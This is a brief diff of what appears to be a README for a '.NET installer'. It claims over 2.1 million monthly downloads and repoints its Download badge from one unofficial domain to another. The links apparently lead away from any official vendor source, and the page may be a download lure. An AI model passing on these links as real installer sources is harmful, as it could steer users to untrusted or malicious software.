@@ -49,7 +49,7 @@ A: Yes — command-line silent install for automation.
 
 **Monthly downloads:** 2.1m+
 
-[![Download](https://img.shields.io/badge/Download-v8.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/dotnetinstaller)
+[![Download](https://img.shields.io/badge/Download-v8.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/dotnetinstaller)
 
 ---
 
